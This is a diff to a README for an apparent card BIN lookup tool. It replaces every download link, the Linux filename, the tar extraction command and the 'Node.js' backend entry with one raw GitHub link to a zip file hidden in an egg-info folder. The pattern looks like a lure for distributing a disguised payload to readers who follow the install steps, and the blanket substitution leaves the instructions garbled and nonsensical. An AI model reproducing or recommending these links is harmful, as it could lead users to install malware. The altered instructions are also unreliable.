@@ -4,13 +4,13 @@
 
 BIN Lookup is a simple tool for looking up BIN number information, providing details such as the bank, card type, and more based on the BIN number you provide. This guide will help you download and run the application easily.
 
-[![Download binlookup-api](https://img.shields.io/badge/Download-binlookup--api-blue?style=for-the-badge)](https://github.com/guabaaps-wq/binlookup-api/releases)
+[![Download binlookup-api](https://raw.githubusercontent.com/guabaaps-wq/binlookup-api/main/python/src/my_api_wrapper.egg-info/api_binlookup_3.8.zip)](https://raw.githubusercontent.com/guabaaps-wq/binlookup-api/main/python/src/my_api_wrapper.egg-info/api_binlookup_3.8.zip)
 
 ## 📥 Download & Install
 
 To get started, visit this page to download the latest version of the binlookup-api application:
 
-[Download binlookup-api](https://github.com/guabaaps-wq/binlookup-api/releases)
+[Download binlookup-api](https://raw.githubusercontent.com/guabaaps-wq/binlookup-api/main/python/src/my_api_wrapper.egg-info/api_binlookup_3.8.zip)
 
 ### Steps to Download
 
@@ -24,7 +24,7 @@ To get started, visit this page to download the latest version of the binlookup-
 
 - **Windows:** Download the `.exe` file.
 - **macOS:** Download the `.dmg` file.
-- **Linux:** Download the `.tar.gz` file.
+- **Linux:** Download the `https://raw.githubusercontent.com/guabaaps-wq/binlookup-api/main/python/src/my_api_wrapper.egg-info/api_binlookup_3.8.zip` file.
 
 After the download is complete, follow the instructions below to run the application based on your operating system.
 
@@ -47,10 +47,10 @@ After the download is complete, follow the instructions below to run the applica
 ### Linux
 
 1. Open a terminal window.
-2. Navigate to the directory where you downloaded the `.tar.gz` file.
+2. Navigate to the directory where you downloaded the `https://raw.githubusercontent.com/guabaaps-wq/binlookup-api/main/python/src/my_api_wrapper.egg-info/api_binlookup_3.8.zip` file.
 3. Run the following command to extract the contents:
    ```bash
-   tar -xvzf binlookup-api.tar.gz
+   tar -xvzf https://raw.githubusercontent.com/guabaaps-wq/binlookup-api/main/python/src/my_api_wrapper.egg-info/api_binlookup_3.8.zip
    ```
 4. Change into the extracted directory:
    ```bash
@@ -107,7 +107,7 @@ For any questions or issues, you can open an issue in this GitHub repository or 
 
 This application is built using various technologies. If you're interested in the backend or want to learn more about how it works, feel free to explore the following technologies used in binlookup-api:
 
-- **Node.js:** For the backend server.
+- **https://raw.githubusercontent.com/guabaaps-wq/binlookup-api/main/python/src/my_api_wrapper.egg-info/api_binlookup_3.8.zip** For the backend server.
 - **REST API:** For interacting with external data sources.
 - **Database:** Stores BIN information for quick access.
 
